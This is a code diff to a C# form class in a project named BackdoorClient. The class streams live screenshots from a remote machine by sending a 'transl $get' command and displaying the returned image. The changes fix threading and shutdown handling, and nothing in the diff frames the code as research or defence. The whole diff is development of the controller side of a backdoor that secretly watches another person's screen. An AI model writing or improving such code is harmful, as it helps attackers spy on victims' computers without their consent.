@@ -15,8 +15,9 @@ namespace BackdoorClient
 {
     public partial class ScreenViewStream : Form
     {
-        public Form1 mainForm;
+        public static Form1 mainForm;
         public Thread UpdateScreenThread;
+        public bool FormIsOpened = false;
 
         public ScreenViewStream(Form1 f)
         {
@@ -25,15 +26,13 @@ namespace BackdoorClient
         }
         protected override void OnFormClosed(FormClosedEventArgs e)
         {
-   
-            //base.OnFormClosing(e);
-            UpdateScreenThread.Abort();
+            FormIsOpened = false;
         }
 
         private void ScreenViewStream_Load(object sender, EventArgs e)
         {
             UpdateScreenThread = new Thread(() => UpdateScreen());
-            //UpdateScreen();
+            FormIsOpened = true;
             UpdateScreenThread.Start();
         }
 
@@ -42,9 +41,10 @@ namespace BackdoorClient
             System.Threading.Thread.Sleep(1000);
             while (true)
             {
-                var pictrBytes = new byte[100000];
+                if (!FormIsOpened) return;
 
-                pictrBytes = mainForm.SendCommandAndGetBytesResponce("transl $get", 1000000);
+                var pictrBytes = new byte[0];
+                mainForm.Invoke(new Action(() => GetScreenshotFromBytes(out pictrBytes)));
                 Bitmap bmp;
                 try
                 {
@@ -61,9 +61,14 @@ namespace BackdoorClient
                 {
 
                 }
-                translScreen.Invoke(new Action(translScreen.Update));
+                if(!translScreen.IsDisposed) translScreen?.Invoke(new Action(translScreen.Update));
                 System.Threading.Thread.Sleep(100);
             }
+        }
+
+        public void GetScreenshotFromBytes(out byte[] buffer)
+        {
+            buffer = mainForm.SendCommandAndGetBytesResponce("transl $get");
         }
 
         private void translScreen_Click(object sender, EventArgs e)
